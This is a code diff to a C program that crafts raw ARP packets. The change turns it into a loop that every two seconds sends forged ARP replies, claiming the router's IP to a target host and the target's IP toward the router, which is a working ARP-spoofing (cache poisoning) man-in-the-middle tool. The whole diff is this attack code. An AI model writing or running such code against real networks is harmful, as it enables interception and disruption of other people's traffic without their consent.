@@ -14,6 +14,7 @@
 #include <stdlib.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>
+#include <unistd.h>
 #include <net/if.h>
 #include <netinet/ether.h>
 
@@ -28,6 +29,7 @@
 
 #define DEFAULT_IF	"eth0"
 #define BUF_SIZ		1518
+
 
 int main(int argc, char *argv[])
 {
@@ -94,45 +96,66 @@ int main(int argc, char *argv[])
 	//sendbuf[tx_len++] = 0xbe;
 	//sendbuf[tx_len++] = 0xef;
 	memcpy(sendbuf + tx_len, ARP_header, sizeof(ARP_header));
-	tx_len += sizeof(ARP_header);	
+	tx_len += sizeof(ARP_header);
 	
-	/*send to target */
 	memcpy(sendbuf +tx_len, eh->ether_shost,6); //source MAC
-	tx_len += 6;
-	memcpy(sendbuf + tx_len, router_ip, 4); //source IP
-	tx_len += 4;
-	memset(sendbuf + tx_len, 0, 6); //dest MAC
-	tx_len += 6;
-	memcpy(sendbuf + tx_len, target_ip, 4); //dest IP
-	tx_len += 4;
-	/////////////////////////	
-	/* Index of the network device */
-	socket_address.sll_ifindex = if_idx.ifr_ifindex;
-	/* Address length*/
-	socket_address.sll_halen = ETH_ALEN;
-	/* Destination MAC */
-	socket_address.sll_addr[0] = TARGET_MAC0;
-	socket_address.sll_addr[1] = TARGET_MAC1;
-	socket_address.sll_addr[2] = TARGET_MAC2;
-	socket_address.sll_addr[3] = TARGET_MAC3;
-	socket_address.sll_addr[4] = TARGET_MAC4;
-	socket_address.sll_addr[5] = TARGET_MAC5;
+	tx_len += 6;	
+	while(1)
+	{
+		/*send to target */
+		
+		memcpy(sendbuf + tx_len, router_ip, 4); //source IP
+		tx_len += 4;
+		memset(sendbuf + tx_len, 0, 6); //dest MAC
+		tx_len += 6;
+		memcpy(sendbuf + tx_len, target_ip, 4); //dest IP
+		tx_len += 4;
+		/////////////////////////	
+		/* Index of the network device */
+		socket_address.sll_ifindex = if_idx.ifr_ifindex;
+		/* Address length*/
+		socket_address.sll_halen = ETH_ALEN;
+		/* Destination MAC */
+		socket_address.sll_addr[0] = TARGET_MAC0;
+		socket_address.sll_addr[1] = TARGET_MAC1;
+		socket_address.sll_addr[2] = TARGET_MAC2;
+		socket_address.sll_addr[3] = TARGET_MAC3;
+		socket_address.sll_addr[4] = TARGET_MAC4;
+		socket_address.sll_addr[5] = TARGET_MAC5;
 
-	/* Send packet */
-	if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-	    printf("Send failed\n");
+		/* Send packet */
+		if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+			printf("Send failed\n");
 
 
-	tx_len -= 4+6+4;
-	/*send to router */
-	memcpy(sendbuf + tx_len, target_ip, 4); //source IP
-	tx_len += 4;
-	memset(sendbuf + tx_len, 0, 6); //dest MAC
-	tx_len += 6;
-	memcpy(sendbuf + tx_len, router_ip, 4); //dest IP
-	tx_len += 4;
-	if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-	    printf("Send failed\n");
-	/////////////////////////	
+		tx_len -= 14;
+		/*send to router */
+		memcpy(sendbuf + tx_len, target_ip, 4); //source IP
+		tx_len += 4;
+		memset(sendbuf + tx_len, 0, 6); //dest MAC
+		tx_len += 6;
+		memcpy(sendbuf + tx_len, router_ip, 4); //dest IP
+		tx_len += 4;
+		
+		/* Index of the network device */
+		socket_address.sll_ifindex = if_idx.ifr_ifindex;
+		/* Address length*/
+		socket_address.sll_halen = ETH_ALEN;
+		/* Destination MAC */
+		socket_address.sll_addr[0] = TARGET_MAC0;
+		socket_address.sll_addr[1] = TARGET_MAC1;
+		socket_address.sll_addr[2] = TARGET_MAC2;
+		socket_address.sll_addr[3] = TARGET_MAC3;
+		socket_address.sll_addr[4] = TARGET_MAC4;
+		socket_address.sll_addr[5] = TARGET_MAC5;
+		
+		
+		if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+			printf("Send failed\n");
+		/////////////////////////
+		tx_len -= 14;
+		
+		sleep(2);
+	}
 	return 0;
 }
